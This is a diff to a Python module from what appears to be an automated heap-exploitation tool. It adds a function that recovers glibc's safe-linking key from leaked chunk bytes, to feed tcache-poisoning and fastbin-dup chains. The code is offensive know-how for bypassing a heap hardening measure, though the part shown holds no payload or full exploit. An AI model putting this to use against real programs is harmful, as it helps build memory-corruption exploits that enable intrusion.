@@ -28,6 +28,7 @@ fastbin dup -- are the next lowerings; their groom is already modelled, they add
 """
 from __future__ import annotations
 
+import re
 import struct
 from dataclasses import dataclass
 from typing import Callable, Optional
@@ -163,3 +164,31 @@ def is_plausible_heap_key(value: int) -> bool:
     gate on purpose (a non-PIE brk heap shifts to a small key, e.g. 0x414 with ASLR off): the
     execution oracle, not this filter, is what rejects a wrong guess."""
     return 0x100 <= value < (1 << 36)
+
+
+def parse_heap_key(leak: bytes) -> Optional[int]:
+    """Recover the safe-linking key (addr>>12) from a leak's bytes, ROBUST to how the target printed
+    the freed chunk's fd:
+      * a hex pointer ("fd: 0x5555555592a0") -- a %p/%lx view;
+      * a full little-endian word inside a fixed-width raw dump -- a write(fd, chunk, n) view;
+      * a NUL-/newline-truncated raw string -- a %s view stops at the first NUL, so only the key's
+        significant low bytes are printed (the high bytes of addr>>12 are zero and get dropped),
+        which the per-line little-endian read reconstructs.
+    Returns the first plausible key, or None. Only PROPOSES a key -- the execution oracle is what
+    confirms it, so a loose parse is safe. This is why a raw-string leak (not just a clean %p) now
+    feeds the tcache-poison and fastbin-dup chains."""
+    if not leak:
+        return None
+    cands = []
+    for m in re.findall(rb"0x([0-9a-fA-F]{3,16})", leak):
+        try:
+            cands.append(int(m, 16))
+        except ValueError:                               # pragma: no cover - re guarantees hex
+            pass
+    # Fixed-width raw dump: the fd is a full 8-byte word somewhere in the output.
+    cands += [int.from_bytes(leak[i:i + 8], "little") for i in range(0, max(0, len(leak) - 7))]
+    # %s / newline-delimited: the printed run before each newline is the key's low bytes.
+    for line in leak.split(b"\n"):
+        if line:
+            cands.append(int.from_bytes(line[:8], "little"))
+    return next((v for v in cands if is_plausible_heap_key(v)), None)
